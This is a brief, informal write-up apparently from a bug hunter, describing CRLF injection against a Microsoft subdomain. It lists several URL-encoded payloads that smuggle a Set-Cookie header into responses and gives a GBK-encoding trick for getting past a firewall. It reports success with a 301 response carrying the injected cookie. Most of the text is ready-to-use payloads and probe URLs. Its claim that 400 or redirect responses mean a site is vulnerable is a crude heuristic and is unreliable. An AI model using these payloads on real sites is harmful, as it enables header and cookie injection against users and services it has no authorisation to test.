- 	if you inject the payload like : 
	https://subDomain.microsoft.com/%0D%0A%20Set-Cookie:whoami=thecyberneh
	and the response is 400 or 301 or 302 that means is VULN or firewall weak protected

-	if you inject the payload and response is return “404 Not Found” that means NOT VLUN and protected well



payloads

%0D%0A%20Set-Cookie:whoami=thecyberneh
%20%0D%0ASet-Cookie:whoami=thecyberneh
%0A%20Set-Cookie:whoami=thecyberneh
%2F%2E%2E%0D%0ASet-Cookie:whoami=thecyberneh


	I was only getting “400 Bad Request” so I thought that I need something different because most firewall blocks normal and basic payloads. I did little research and got some unique encoding called “GBK encoding”.
	so after URL encoding, I crafted a new payload like this
					https://subDomain.microsoft.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=thecyberneh
>>	I tried with this URL and BOOOoom!!!
	I got a response 301 and the header was: Set-Cookie: crlfinjection=thecyberneh
